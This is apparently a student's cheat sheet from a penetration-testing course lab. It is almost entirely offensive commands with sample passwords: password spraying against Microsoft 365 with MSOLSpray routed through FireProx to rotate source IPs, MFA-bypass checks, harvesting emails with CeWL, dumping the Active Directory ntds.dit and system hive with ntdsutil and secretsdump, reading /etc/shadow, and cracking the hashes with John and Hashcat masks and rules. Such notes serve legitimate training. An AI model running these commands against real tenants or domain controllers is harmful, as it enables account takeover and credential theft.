# MSOLSpray
import-module /opt/msolspray/msolpray.ps1 
invoke-msolspray -userlist users.txt -password Clippers22
## API FireProx
python fire.py --command create --region us-east-1 --url https://login.microsoft.com 
pwsh 
import-module /opt/msolspray/msolpray.ps1 
invoke-msolspray -userlist users.txt -URL https://7t4123123.execute-api us-east-1.amazonaws.com/fireprox/ Falismentis123 
## MSOL IR Identification
get-msoluser -all | where {$_.islicensed -eq $true}| Select displayname, @{n="License ID";e={$_.licenses.accountskuid}}

# MFA Bypass
invoke-mfasweep -username james@sans.org -password cyberus2022 

## CeWL for emails
/opt/cewl/cewl.rb -d 8 -w words.txt -e --email_file email.txt http://www.falsimentis.com/

## Pull ntds.dit and system hive 
ntdsutil 
	activate instance ntdsifm
	create full C:\ntds 
	quit && quit 
	
impacket-secretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL 

## Unshadow
cat /etc/shadow > shadow && cat /etc/passwd > passwd 
unshadow passwd shadow > combined 
john combined 

## JOhn
john --list=formats
## Hashcat
hashcat -h | grep ntlm

hashcat -m 1000 -a hashes.txt words.txt 
### Special Character then Number
hashcat -m 1000 -a 6 hashes.txt words.txt ?s?d 
### Uppercase, then 5 lowercase, then 2 numbers 
hashcat -m 1000 -a 3 hashes.txt ?u?1?1?1?1?1?d?d 
### Best64
hashcat -m 1000 -a 0 w99.ntds ~/labs/hashcat/wordlist.txt -r /opt/hashcat/rules/best64.rule 